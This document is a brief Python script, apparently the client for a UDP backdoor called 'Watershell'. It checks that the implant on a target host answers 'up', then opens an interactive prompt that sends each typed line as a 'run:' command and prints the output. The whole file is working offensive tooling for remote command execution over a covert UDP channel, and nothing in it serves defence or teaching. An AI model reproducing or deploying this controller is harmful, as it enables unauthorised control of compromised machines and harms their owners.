import socket, time, sys


def recv_timeout(the_socket,timeout=2):
    #make socket non blocking
    the_socket.setblocking(0)
    
    #total data partwise in an array
    total_data=[];
    data='';
    
    #beginning time
    begin=time.time()
    while 1:
        #if you got some data, then break after timeout
        if total_data and time.time()-begin > timeout:
            break
        
        #if you got no data at all, wait a little longer, twice the timeout
        elif time.time()-begin > timeout*2:
            break
        
        #recv something
        try:
            data = the_socket.recv(8192)
            if data:
                total_data.append(data.decode())
                #change the beginning time for measurement
                begin=time.time()
            else:
                #sleep for sometime to indicate a gap
                time.sleep(0.1)
        except:
            pass
    
    #join all parts to make final string
    return ''.join(total_data)

if __name__ == '__main__':
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(("", 53316))
    box = (sys.argv[1], int(sys.argv[2]))
    print("Connecting to Watershell on {}...".format(box))
    s.sendto(b'status:', box)
    resp = recv_timeout(s, 1)
    if resp == "up":
        print("Connected!")
    else:
        print("Connection Failed...")
        sys.exit(1)
    while True:
        cmd = input("//\\\\watershell//\\\\>> ")
        if cmd == 'exit':
            break
        if len(cmd) > 1:
            s.sendto(("run:"+cmd).encode(), box)
            resp = recv_timeout(s, 2)
            print(resp)
